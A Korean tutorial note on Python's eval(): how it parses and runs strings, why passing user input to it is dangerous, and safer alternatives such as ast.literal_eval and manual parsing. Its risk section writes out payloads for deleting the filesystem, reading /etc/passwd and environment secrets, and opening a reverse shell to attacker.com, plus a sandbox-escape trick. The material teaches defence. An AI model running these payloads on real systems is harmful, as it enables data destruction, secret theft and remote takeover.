# eval() 함수와 보안 위험

> 문자열을 Python 코드로 실행하는 내장 함수 - 강력하지만 위험함

## 기본 정보

```python
eval(expression, globals=None, locals=None)
```

- **타입**: 내장 함수 (import 불필요)
- **용도**: 문자열로 된 Python 표현식을 실행
- **반환**: 표현식의 평가 결과

---

## 내부 동작 원리

```python
eval("3 + 4")  # 결과: 7
```

**동작 과정:**
1. 문자열 `"3 + 4"`를 Python 파서에 전달
2. **AST(Abstract Syntax Tree)**로 변환
3. **바이트코드**로 컴파일
4. Python 인터프리터가 **실행**

핵심: **문자열을 실제 Python 코드로 실행**한다

---

## 기본 사용법

### 수식 계산

```python
eval("3 + 4")           # 7
eval("2 ** 10")         # 1024
eval("[1, 2, 3]")       # [1, 2, 3]
eval("{'a': 1}")        # {'a': 1}
```

### 변수 참조

```python
x = 10
eval("x * 2")           # 20
eval("x + y", {"x": 1, "y": 2})  # 3 (globals 지정)
```

---

## 보안 위험성

### 왜 위험한가?

```python
# 사용자 입력을 받는 계산기
user_input = input("수식 입력: ")
result = eval(user_input)  # ❌ 절대 금지!
```

**정상 입력**: `"3 + 4"` → 7 ✅

### 악의적 입력 예시

```python
# 1. 시스템 명령 실행 (파일 삭제)
eval("__import__('os').system('rm -rf /')")

# 2. 민감 정보 탈취
eval("__import__('os').system('cat /etc/passwd')")

# 3. 파일 읽기
eval("open('config.py').read()")

# 4. 환경변수 탈취 (DB 비밀번호 등)
eval("__import__('os').environ.get('DB_PASSWORD')")

# 5. 리버스 쉘 (해커가 서버에 접속)
eval("__import__('os').system('nc -e /bin/sh attacker.com 4444')")
```

### 실제 공격 시나리오

```python
# 웹 계산기 서비스
@app.route('/calc')
def calc():
    expr = request.args.get('expr')  # URL: /calc?expr=3+4
    return str(eval(expr))  # ❌ 취약점!

# 해커의 공격 URL:
# /calc?expr=__import__('subprocess').getoutput('whoami')
# → 서버의 사용자 정보 노출!
```

---

## eval vs exec

| 함수 | 용도 | 반환값 |
|------|------|--------|
| `eval()` | 표현식(expression) 실행 | 결과값 반환 |
| `exec()` | 문장(statement) 실행 | None |

```python
eval("3 + 4")         # 7 반환
exec("x = 3 + 4")     # None 반환, x에 7 할당
```

**둘 다 보안상 위험!**

---

## 안전한 대안

### 1. ast.literal_eval (리터럴만 허용)

```python
import ast

# 안전한 리터럴만 파싱
ast.literal_eval("[1, 2, 3]")       # ✅ [1, 2, 3]
ast.literal_eval("{'a': 1}")        # ✅ {'a': 1}
ast.literal_eval("True")            # ✅ True

# 연산/함수 호출은 불가
ast.literal_eval("3 + 4")           # ❌ ValueError
ast.literal_eval("__import__('os')") # ❌ ValueError
```

**지원 타입**: 문자열, 바이트, 숫자, 튜플, 리스트, 딕셔너리, 집합, 불린, None

### 2. 직접 파싱 (수식 계산)

```python
def safe_calc(expr: str) -> int:
    """안전한 수식 계산기 (+, - 만 지원)"""
    tokens = expr.split()
    result = int(tokens[0])
    for i in range(1, len(tokens), 2):
        op, num = tokens[i], int(tokens[i + 1])
        result = result + num if op == "+" else result - num
    return result

safe_calc("3 + 4 - 2")  # 5
```

### 3. 수학 라이브러리 활용

```python
# sympy - 기호 수학
from sympy import sympify
sympify("3 + 4")  # 7

# numexpr - 수치 연산 (NumPy 배열용)
import numexpr as ne
ne.evaluate("3 + 4")  # array(7)
```

### 4. 제한된 eval (권장하지 않음)

```python
# globals/locals를 비워도 완전히 안전하지 않음!
eval("3 + 4", {"__builtins__": {}}, {})  # 7

# 여전히 우회 가능:
eval("().__class__.__bases__[0].__subclasses__()", {"__builtins__": {}})
```

---

## 코딩테스트에서의 사용

### 허용되는 경우 (입력이 신뢰할 수 있음)

```python
# 프로그래머스/백준에서는 입력이 통제됨
def solution(my_string):
    return eval(my_string)  # 간단하지만...
```

### 권장하는 방식

```python
# 직접 파싱이 더 좋은 습관
def solution(my_string):
    tokens = my_string.split()
    result = int(tokens[0])
    for i in range(1, len(tokens), 2):
        op, num = tokens[i], int(tokens[i + 1])
        result = result + num if op == "+" else result - num
    return result
```

---

## 사용 가이드라인

| 상황 | 권장 방법 |
|------|----------|
| 사용자 입력 처리 | ❌ eval 절대 금지 |
| JSON 파싱 | `json.loads()` |
| 리터럴 변환 | `ast.literal_eval()` |
| 수식 계산 | 직접 파싱 또는 `sympy` |
| 코딩테스트 | 가능하지만 직접 파싱 권장 |

---

## 요약

1. **eval()은 문자열을 실제 코드로 실행**한다
2. **사용자 입력 + eval = 서버 탈취 위험**
3. **대안**: `ast.literal_eval()`, 직접 파싱, 수학 라이브러리
4. **코딩테스트에서는 편리하지만**, 실무 습관을 위해 직접 파싱 권장

---

*관련 문제: #120902 문자열 계산하기*
